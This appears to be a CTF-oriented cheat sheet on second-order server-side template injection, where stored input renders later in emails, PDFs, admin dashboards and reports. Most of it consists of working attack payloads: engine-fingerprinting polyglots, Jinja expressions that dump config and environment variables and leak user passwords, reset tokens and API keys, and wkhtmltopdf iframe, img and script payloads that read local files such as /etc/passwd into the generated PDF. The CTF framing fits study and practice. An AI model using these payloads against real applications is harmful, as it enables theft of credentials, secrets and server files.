# Email / PDF / report artifacts — second-order render paths

The SSTI you can't see fire: input stored → rendered LATER into
an email, PDF, invoice, export, or admin dashboard. Different
bound objects, different context, often a different engine.

---

## 1. The pipeline shapes

```text
web-form → DB → nightly report email   → mailer-template engine
order-note → DB → invoice PDF          → pdf-template (jinja/wkhtml)
support-ticket → queue → admin-view    → dashboard template
user-profile → audit-log → log-view    → log-renderer
csv-upload → report-gen → download     → report-template
registration → welcome-email           → mail-template
booking-ref → confirmation-PDF         → pdf-engine
feedback-form → digest-email           → digest-template
```

Every "we'll email you" / "download the report" / "admin reviews"
is a deferred render — your input becomes template source LATER,
in a context you never see directly.

## 2. Why the context differs

```text
Web-request render:   request/session/g bound, request-scoped vars
Email render:         mailer-context — user/order/company objects
                      NO request object — but richer model objects
PDF render:           doc-context — order/items/totals — no web
Admin-dash render:    admin-scope — MORE privileged objects
CLI/batch render:     env/config objects, filesystem access
```

`request` may be absent in mail-render — but `order`/`user`/
`company`/`config` objects show up. The payload that failed in
the web response may work in the email — and vice versa.

## 3. Probe strategy — mark-and-listen

```text
1. Submit marked value:  {{7*7}}Z9X  — arithmetic + unique tail
2. Trigger the render:   request the invoice / wait for the mail /
                         poll the admin-view endpoint
3. Read the artifact:    the email body / the PDF text / the dash
4. Look for: 49Z9X (fired) vs {{7*7}}Z9X (literal) vs error-mail
```

PDF text: `tools/web/pdf_text.py` pulls text from the returned
PDF — grep it for `49` or your marker.

Email: CTF mailers often have a `/mail`/`/inbox`/`/webmail`
endpoint, or a MailHog/MailDev on another port, or the SMTP
catchall writes to a file.

## 4. The polyglot matters most here

You get ONE render per trigger — no iteration. Fire the full
detection polyglot (see `polyglots.md`):

```text
{{7*7}}Z1${7*7}Z2<%=7*7%>Z3#{7*7}Z4
   → each segment tagged — the rendered digit names the engine
   → "49Z1${7*7}Z2<%=7*7%>Z3#{7*7}Z4" = Jinja-family in mailer
```

Then the grab-bag line for objects:

```text
{{config}}A${.data_model}B<%=ENV%>C{{_context}}D${request}E
```

Whatever binds in the mailer context dumps itself.

## 5. Payloads tuned for artifact renders

### Email — leak to yourself
```jinja2
{{config}}                    -- in subject or body — comes to YOU
{{lipsum.__globals__.os.environ}}
{{user.password}} {{user.reset_token}} {{user.api_key}}
{{order.notes}} {{company.secrets}}
```

Email renders put YOUR content in YOUR inbox — a blind SSTI that
exfiltrates by delivery. The flag-in-config leak arrives readable.

### PDF — server-side render quirks

wkhtmltopdf/wkhtmltoimage render HTML→PDF — the template is HTML
plus an engine pre-pass. Double surface:

```text
1. Engine SSTI in the template-source (jinja et al — as above)
2. wkhtmlto* HTML/JS in the RENDERER — <iframe src=file:///flag>
   the PDF-rendered iframe can embed local files!
   <img src=file:///flag> → rendered into the PDF image
   → file-read via the PDF OUTPUT — no engine eval needed
   <script>document.write(...)</script> — wkhtmlto runs JS
   → XMLHttpRequest file:/// reads inside the renderer
```

The wkhtmlto-file-read is a classic CTF chain: SSTI-or-HTML-
injection → `<iframe src="file:///etc/passwd">` → the generated
PDF CONTAINS the file → `pdf_text` pulls it.

### Admin-dashboard — the privileged context

```jinja2
{{app.config}}                   -- admin-scope — MORE bound objects
{{dashboard.secrets}} {{admin}}
{{_context}}                      -- dump everything bound in admin
{{user.password_hash}} {{settings}}
```

Admin renders often bind MORE objects (system stats, all-users,
config) — the stored value an admin sees reaches a richer context
than the public one.

## 6. The trigger-elsewhere problem — reaching your own render

```text
- invoice endpoint: /invoice?id=X → maybe render-orders YOURS only
- report endpoint: /report?user=you → renders your data
- admin-view: no access → wait for the digest / scheduled render
- email: check spam-port / catchall / the app's own outbox
- PDF: request your own → the artifact is the response
- export/csv: download and grep for markers in the file
```

The render may be queued/cron — timing matters: fire payloads,
sleep, poll the artifact endpoint, grep for marker × render-time.

## 7. Stored-SSTI evidence discipline

```text
- Record: storage-endpoint, render-endpoint, render-trigger,
  the marker, the engine identified, the object inventory
- The render may have a DIFFERENT engine than the web tier —
  report-generation libs use their own (e.g. reportlab+jinja
  vs the web's twig) — polyglot first ALWAYS
- One render per payload → batch your polyglot — don't spend
  five render-cycles fingerprinting
- Cache: reports may be cached → bust with a nonce in the
  payload that makes each render unique
```
